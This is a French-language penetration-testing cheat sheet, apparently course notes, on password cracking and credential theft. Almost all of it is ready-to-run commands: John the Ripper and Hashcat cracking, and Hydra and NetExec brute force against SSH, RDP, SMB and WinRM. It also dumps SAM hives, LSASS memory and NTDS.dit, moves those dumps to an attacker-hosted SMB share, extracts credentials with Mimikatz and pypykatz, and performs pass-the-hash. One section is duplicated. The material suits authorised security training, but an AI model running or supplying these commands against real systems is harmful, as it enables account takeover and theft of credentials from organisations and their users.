# John The Ripper 

### Introduction

John the Ripper (john / JtR) est un outil open-source de référence pour le *password cracking* (brute-force, dictionnaire, etc.), avec de nombreux modes d’attaque et un support étendu de formats de hash.  
**Astuce** : Utiliser la version “jumbo” pour profiter de toutes les fonctionnalités.

## Modes d’attaque

### Single Crack Mode

**Utilise les infos du compte utilisateur (login, répertoire, GECOS) pour générer des mots de passe candidats.**
```bash
john --single <fichier_hash>
```
Exemple : Crack rapide basé sur les infos de l’utilisateur Linux (utile sur /etc/passwd ou /etc/shadow).

### Wordlist Mode (mode dictionnaire)

**Teste chaque mot d’un wordlist comme mot de passe candidat (attaque par dictionnaire).**
```bash
john --wordlist=<wordlist_file> <hash_file>
```
Possibilité d’ajouter `--rules` pour transformer les mots (capitalisation, ajouts de chiffres…).

### Incremental Mode (mode incrémental)

**Brute-force avancé basé sur des statistiques de mots de passe réels (Markov chain).**
```bash
john --incremental <hash_file>
```
Le plus exhaustif (et lent) : essaye toutes les combinaisons de caractères selon un charset défini.


## Identifier un format de hash

**Utilise hashid pour deviner le type de hash et obtenir la syntaxe John correspondante.**
```bash
hashid -j <hash>
```
Affiche tous les formats potentiels et la syntaxe --format=xxx à utiliser avec john.

### Spécifier le format de hash dans John

**Forcer le format de hash à utiliser si John ne détecte pas automatiquement.**
```bash
john --format=<format_john> <hash_file>
```

## Cracker des fichiers protégés (PDF, ZIP, RAR, etc.)

**Convertir un fichier en hash compatible John avec les outils *2john, puis cracker avec John.**
```bash
<tool> <fichier> > fichier.hash
john fichier.hash
```
Exemples d’outils :
- pdf2john, zip2john, rar2john, office2john, keepass2john, ssh2john, gpg2john, etc.

## Afficher les mots de passe crackés

**Afficher les résultats déjà trouvés par John.**
```bash
john --show <hash_file>
```
## Ressources complémentaires

- [Doc](https://github.com/openwall/john/tree/bleeding-jumbo/doc) (Openwall)
- [PentestMonkey hash formats](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)

# Hashcat

## Présentation

Hashcat est un puissant outil de *password cracking* multi-plateforme (Linux, Windows, macOS) optimisé GPU, supportant de nombreux formats de hash et modes d’attaque.  
Chaque mode ou format s’utilise via des options dédiées.


## Syntaxe Générale
```bash
hashcat -a <mode> -m <id_hash> <hashes> [wordlist, rule, mask, ...]
```

- `-a` : mode d’attaque (0 = dictionnaire, 3 = mask, etc.)
- `-m` : identifiant du type de hash (ex : 0 pour MD5, 1000 pour NTLM)
- `<hashes>` : fichier ou hash(s) à casser
- `[wordlist, rule, mask, ...]` : dépend du mode utilisé

## Identifier le type de hash

Lister tous les modes/ID supportés :
```bash
hashcat --help
```

## Dictionnaire (Dictionary Attack, -a 0)

Teste chaque mot du wordlist comme mot de passe candidat.
```bash
hashcat -a 0 -m <id_hash> <hash> <wordlist>
```

## Dictionnaire + Règles

Applique des transformations aux mots du wordlist pour générer plus de candidats.
```bash
hashcat -a 0 -m <id_hash> <hash> <wordlist> -r <fichier_regle>
```

Lister les règles disponibles :
```bash
ls /usr/share/hashcat/rules/
```

## Mask Attack (attaque par masque, -a 3)

Brute-force ciblé : définit le pattern de mot de passe à tester avec des masques.
```bash
hashcat -a 3 -m <id_hash> <hash> <mask>
```

**Symboles de masque principaux :**
- ?l : lettre minuscule
- ?u : lettre majuscule
- ?d : chiffre
- ?s : symbole spécial
- ?a : tous caractères imprimables

## Exemples d'options utiles

- Voir l’avancement :
```bash
hashcat --status
```

- Forcer l’utilisation CPU (au lieu de GPU) :
```bash
hashcat -D 1 ...
```
- Reprendre une session :
```bash
hashcat --restore
```

## Ressources utiles

- [Liste complète des hash modes Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [Hashcat rules documentation](https://hashcat.net/wiki/doku.php?id=rule_based_attack)


---

# Cracking Protected Files

## Trouver des fichiers chiffrés / protégés

Rechercher les fichiers à extensions courantes (Office, PDF, etc.) sur un système Linux :
```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
echo -e "\nFile extension: $ext"
find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core"
done
```
*Cherche sur tout le disque les fichiers de type document potentiellement chiffrés/protégés.*

## Trouver des clés SSH privées

Chercher des clés SSH privées par leur entête (HEADER) :
```bash
grep -rnE '^-{5}BEGIN [A-Z0-9]+ PRIVATE KEY-{5}$' /* 2>/dev/null
```
*Repère tous les fichiers contenant une clé privée (RSA, ED25519, etc.).*

## Vérifier si une clé SSH est chiffrée

Lire la clé pour voir si elle demande une passphrase :
```bash
ssh-keygen -yf ~/.ssh/id_rsa
```

*Si elle est protégée, un prompt passphrase apparaît. Sinon, la clé publique s’affiche.*

## Extraire un hash depuis un fichier protégé (avec *2john)

Extraire le hash :
```bash
ssh2john.py SSH.private > ssh.hash
```

Cracker avec John :
```bash
john --wordlist=rockyou.txt ssh.hash
```

Afficher les résultats :
```bash
john ssh.hash --show
```

### Exemple : Cracker un document Office

Extraire le hash :
```bash
office2john.py Protected.docx > protected-docx.hash
```

Cracker : 
```bash
john --wordlist=rockyou.txt protected-docx.hash
```

### Exemple : Cracker un PDF protégé

Extraire le hash :
```bash
pdf2john.py PDF.pdf > pdf.hash
```

Cracker : 
```bash
john --wordlist=rockyou.txt pdf.hash
```

# Cracking Protected Archives

## Identifier les types d’archives courants

Lister toutes les extensions d’archives reconnues par FileInfo :
```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "." | tee -a compressed_ext.txt
```
*Génère une liste de toutes les extensions d’archives connues et l’enregistre dans `compressed_ext.txt`.*


## Cracker les fichiers ZIP protégés

Extraire le hash du ZIP avec zip2john et cracker :
```bash
zip2john ZIP.zip > zip.hash
```
```bash
john --wordlist=rockyou.txt zip.hash
```

## Cracker les fichiers GZIP chiffrés avec OpenSSL

Identifier le fichier :
```bash
file GZIP.gzip
```
*Exemple de résultat :*  
`GZIP.gzip: openssl enc'd data with salted password`

Bruteforce avec wordlist (boucle shell) :
```bash
for i in $(cat rockyou.txt); do
openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz
done
```
*Ignore les erreurs. Si le bon mot de passe est trouvé, les fichiers sont extraits dans le dossier courant.*

## Cracker un disque chiffré BitLocker

Extraire les hashs depuis le disque virtuel (ex : .vhd) :
```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker$0" backup.hashes > backup.hash
cat backup.hash
```

Craquer le hash BitLocker avec hashcat :
```bash
hashcat -a 0 -m 22100 <hash_bitlocker> <wordlist>
```

## Monter un disque BitLocker cracké

### Sous Windows

- Double-cliquer sur le `.vhd` : montez le disque.
- Double-cliquer sur le volume BitLocker : saisir le mot de passe cracké.

### Sous Linux (ou macOS) avec dislocker

Installer dislocker :
```bash
sudo apt-get install dislocker
```

Créer les dossiers de montage :
```bash
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
```

Associer le .vhd à un loop device :
```bash
sudo losetup -f -P Backup.vhd
```

Déchiffrer la partition (remplacer `/dev/loop0p2` par la partition réelle, et `1234qwer` par le mot de passe trouvé) :
```bash
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
```

Monter le disque déchiffré :
```bash
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

Parcourir le contenu :
```bash
cd /media/bitlockermount/
ls -la
```

## Ressources utiles

- [Liste des types d’archives (FileInfo)](https://fileinfo.com/filetypes/compressed)
- [Dislocker (outil BitLocker Linux)](https://github.com/Aorimn/dislocker)
- [zip2john, bitlocker2john sur le dépôt John the Ripper](https://github.com/openwall/john/tree/bleeding-jumbo/run)


---

# Network Services

## Généralités

Sur un réseau, les services comme FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP et LDAP sont souvent exposés à l’attaque par mot de passe.  
Outils principaux : **NetExec**, **Hydra**, **Evil-WinRM**, **Metasploit**, **smbclient**, etc.

---

## WinRM

### Découverte & Brute Force (NetExec)
Outil polyvalent pour brute-force et post-exploitation sur de nombreux protocoles (SMB, WinRM, SSH, etc).

**Installation :**
```bash
sudo apt-get -y install netexec
```
Lister les options globales :
```bash
netexec -h
```

Attaquer un endpoint WinRM (bruteforce) :
```bash
netexec winrm <IP> -u <user|userlist> -p <pass|passlist>
```
*Le tag (Pwn3d!) dans la sortie indique un compte compromis.

## Brute Force de protocoles 
### SSH
Brute Force avec Hydra : 
```bash
hydra -L user.list -P password.list ssh://<IP>
```

### RDP (Remote Desktop Protocol)
Brute Force avec Hydra :
```bash
hydra -L user.list -P password.list rdp://<IP>
```

### SMB
Brute Force avec Hydra : 
```bash
hydra -L user.list -P password.list smb://<IP>
```

** Metasploit peut aussi brute force certains protocoles **

--- 

# Attacking SAM, SYSTEM, and SECURITY

## Registry Hives

| Hive                | Description                                                                          |
|---------------------|--------------------------------------------------------------------------------------|
| HKLM\SAM            | Password hashes des comptes locaux                                                   |
| HKLM\SYSTEM         | Clé de démarrage du système, nécessaire pour décrypter le SAM                        |
| HKLM\SECURITY       | Informations sensibles de LSA : caches DCC2, DPAPI keys, cleartext, etc.             |


## Dumper les hives localement

Ouvrir une invite **cmd.exe** en admin :
```bash
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

*Crée `sam.save`, `system.save`, `security.save` sur le système cible.*

## Transférer les hives sur l’attaquant

### Lancer un partage SMB sur l’attaquant

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/<user>/Documents/
```


### Copier les fichiers depuis la machine Windows

```bash
move C:\sam.save \\<IP_attacker>\CompData
move C:\system.save \\<IP_attacker>\CompData
move C:\security.save \\<IP_attacker>\CompData
```

## Dumper les hashes avec secretsdump (Impacket)
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py
-sam sam.save -system system.save -security security.save LOCAL
```

*Affiche bootKey, SAM hashes, DCC2, LSA secrets, DPAPI keys, etc.*

## Cracker les NT hashes avec Hashcat

1. Extraire les NT hashes (colonne `nthash`) dans un fichier `hashes.txt`.  
2. Lancer Hashcat mode 1000 (NTLM) :
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Cracker les DCC2 hashes (cached domain creds)
```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25'
/usr/share/wordlists/rockyou.txt
```

*Mode 2100 – PBKDF2-based, beaucoup plus lent que NTLM.*

## Déchiffrer les DPAPI blobs (ex : Chrome)

Avec Mimikatz :
```bash
mimikatz.exe
dpapi::chrome /in:"C:\Users<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

*Récupère la clé AES puis les credentials stockés.*

## Dump à distance via NetExec

### LSA secrets
```bash
netexec smb <IP> --local-auth -u <user> -p <pass> --lsa
```

### SAM hashes
```bash
netexec smb <IP> --local-auth -u <user> -p <pass> --sam
```

*Permet de dumper SAM et LSA secrets sans accès physique.*

---

# Attacking LSASS

## Dumping LSASS Memory

### a. Task Manager (GUI)
1. Ouvrir Task Manager  
2. Onglet **Processes** → clic droit sur **Local Security Authority Process**  
3. **Create dump file** → `lsass.DMP` dans `%temp%`


## Récupérer le PID de LSASS

CMD :
```bash
tasklist /svc | findstr lsass
```    
*Affiche le PID de lsass.exe*

PowerShell :
```bash
Get-Process lsass
```  
*Affiche le PID de lsass (colonne Id)*

## Dumper la mémoire de LSASS

PowerShell (admin) :
```bash
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```
*Remplace <PID> par celui de lsass, crée le dump C:\lsass.dmp*

## Transférer le dump via SMB

Attaquant :
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support SHARE /chemin/vers/dossier
```
*Lance un partage SMB dans /chemin/vers/dossier* 


Cible :
```bash
move C:\lsass.dmp \\<ip_attaquant>\SHARE
```
*Envoie le dump vers le partage SMB*

## Extraction des credentials avec pypykatz

Attaquant :
```bash
pypykatz lsa minidump /chemin/vers/lsass.dmp
```
*Affiche les hashes/mots de passe/tickets Kerberos/masterkeys DPAPI*

## Cracker un hash NT
```bash
hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
# Remplace <hash> par la valeur NT extraite (ex : NT : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx)
```
*Permet de récupérer le mot de passe du compte loggé.*

---

## Localisation des credentials Windows
```bash
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```
# Dossiers où Windows stocke les credentials chiffrés

## Exporter le Vault via interface
```bash
rundll32 keymgr.dll,KRShowKeyMgr
```

*Ouvre la fenêtre "Stored User Names and Passwords"*

## Lister les credentials du profil courant
```bash
cmdkey /list
```
*Affiche toutes les credentials stockées pour l'utilisateur courant*

## Utiliser un credential pour changer d'utilisateur
```bash
runas /savecred /user:<domaine\utilisateur> cmd
```
*Ouvre un shell cmd avec le compte précisé (si le mot de passe a déjà été enregistré)*

## Extraction de credentials en mémoire avec mimikatz (sur la cible)
```bash
privilege::debug
```
*Élévation des privilèges dans mimikatz*
```bash
sekurlsa::credman
```
*Récupère les credentials en mémoire (ex : login/MDP de services, RDP, sessions stockées...)*

## Outils alternatifs (pour extraction/offline/dump)

SharpDPAPI

*Dump/Decryption des creds protégés par DPAPI (outil C#)*

LaZagne

*Extraction de mots de passe locaux (multi-plateformes, supporte Credential Manager)*

DonPAPI

*Extraction automatisée de secrets DPAPI (local ou à distance, supporte vault/credentials)*


---

## Générer une wordlist de usernames à partir de noms
```bash
cat usernames.txt
```
*Créer une liste personnalisée de usernames à partir de noms trouvés (ex: via OSINT).*
```bash
./username-anarchy -i noms.txt
```
*Génère automatiquement différentes variantes classiques de usernames à partir d'une liste de prénoms/noms.*

## Enumérer les usernames valides sur AD avec Kerbrute
```bash
./kerbrute_linux_amd64 userenum --dc <IP_DC> --domain <domaine.local> noms.txt
```
*Teste chaque username de noms.txt pour vérifier s'il existe dans le domaine spécifié via le DC.*

## Brute-force sur comptes AD (SMB) avec NetExec
```bash
netexec smb <IP_DC> -u <user> -p <wordlist>
```
*Tente d'authentifier l'utilisateur sur SMB (port 445) du contrôleur AD, en testant chaque mot de passe de la wordlist.*

## Connexion à un DC avec Evil-WinRM
```bash
evil-winrm -i <IP_DC> -u <user> -p <password>
```
*Établit une session PowerShell distante sur la cible, si les identifiants sont valides.*

## Vérifier appartenance aux groupes locaux
```bash
net localgroup
```
*Liste les groupes locaux sur le DC et vérifie si le compte utilisé est Admin/Domaine Admin.*

## Vérifier les droits utilisateur/domain
```bash
net user <user>
```
*Affiche tous les détails du compte, y compris les groupes globaux (ex: Domain Admins).*

## Créer un shadow copy du disque (VSS)
```bash
vssadmin CREATE SHADOW /For=C:
```
*Crée une copie snapshot du disque C: pour permettre l'accès à NTDS.dit même si utilisé par AD.*

## Copier NTDS.dit depuis le shadow copy
```bash
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```
*Copie le fichier NTDS.dit depuis le snapshot vers un dossier temporaire (remplace X par l'ID du shadow).*

## Transférer NTDS.dit sur l’attaque host (via SMB)
```bash
cmd.exe /c move C:\NTDS\NTDS.dit \\<IP_ATTACK_HOST>\CompData
```
*Déplace NTDS.dit sur un partage SMB hébergé par l’attaque host (voir smbserver.py plus haut).*

## Extraire les hashes du NTDS.dit avec secretsdump (Impacket)
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
*Dump tous les hashes NT/LM du fichier NTDS.dit + SYSTEM récupérés sur le contrôleur de domaine.*

## Extraction automatique (NTDS.dit) via NetExec
```bash
netexec smb <IP_DC> -u <user> -p <password> -M ntdsutil
```
*Automatise la copie, extraction et dump des hashes du fichier NTDS.dit depuis un DC.*

## Cracker un hash NTLM avec hashcat
```bash
hashcat -m 1000 <hash_NTLM> /usr/share/wordlists/rockyou.txt
```
*Crack un hash NTLM extrait via brute-force/dictionary sur le hash.*

## Pass-the-Hash (PtH) avec Evil-WinRM
```bash
evil-winrm -i <IP_DC> -u <user> -H <hash_NTLM>
```
*Connexion à WinRM en utilisant directement le hash NTLM, sans besoin du mot de passe clair.*

---

# Localisation des credentials Windows

%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\

*Dossiers où Windows stocke les credentials chiffrés*

## Exporter le Vault via interface
```bash
rundll32 keymgr.dll,KRShowKeyMgr
```
*Ouvre la fenêtre "Stored User Names and Passwords"*

## Lister les credentials du profil courant
```bash
cmdkey /list
```
*Affiche toutes les credentials stockées pour l'utilisateur courant*

## Utiliser un credential pour changer d'utilisateur
```bash
runas /savecred /user:<domaine\utilisateur> cmd
```
*Ouvre un shell cmd avec le compte précisé (si le mot de passe a déjà été enregistré)*

## Extraction de credentials en mémoire avec mimikatz (sur la cible)
```bash
privilege::debug
```
*Élévation des privilèges dans mimikatz*
```bash
sekurlsa::credman
```
*Récupère les credentials en mémoire (ex : login/MDP de services, RDP, sessions stockées...)*

## Outils alternatifs (pour extraction/offline/dump)

SharpDPAPI
*Dump/Decryption des creds protégés par DPAPI (outil C#)*

LaZagne
*Extraction de mots de passe locaux (multi-plateformes, supporte Credential Manager)*

---

# Linux Authentication Process

## Vérifier si le hash du mot de passe est directement dans /etc/passwd (rare/old)
```bash
head -n 1 /etc/passwd
```
*Montre la 1ère ligne du fichier. Si le champ mot de passe (après le username) est vide (::), alors login sans mot de passe.*

## Lire l’historique des anciens mots de passe (opasswd PAM)
```bash
sudo cat /etc/security/opasswd
```
*Affiche les anciens hashes pour chaque utilisateur si la politique PAM l’impose (prévention du ré-usage).*

## Fusionner passwd et shadow pour attaque par hashcat/john (unshadow)
```bash
sudo cp /etc/passwd /tmp/passwd.bak
```
*Copie /etc/passwd dans /tmp pour éviter de toucher au fichier original.*

```bash
sudo cp /etc/shadow /tmp/shadow.bak
```
*Copie /etc/shadow dans /tmp (idem).*
```bash
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
*Crée un fichier combiné contenant login:hash pour être utilisé par John the Ripper ou hashcat.*

## Cracker les hashes avec hashcat
```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
*Crack les mots de passe UNIX (hash $6$, $y$, $5$ etc) en utilisant le dictionnaire rockyou.txt.*

## Types de hash courants dans /etc/shadow

* $1$  → MD5
* $2a$ → Blowfish
* $5$  → SHA-256
* $6$  → SHA-512
* $y$  → Yescrypt (par défaut sur Debian récentes)
* $7$  → Scrypt

*L’ID de hash se trouve au début du champ mot de passe dans /etc/shadow, entre deux $.*




























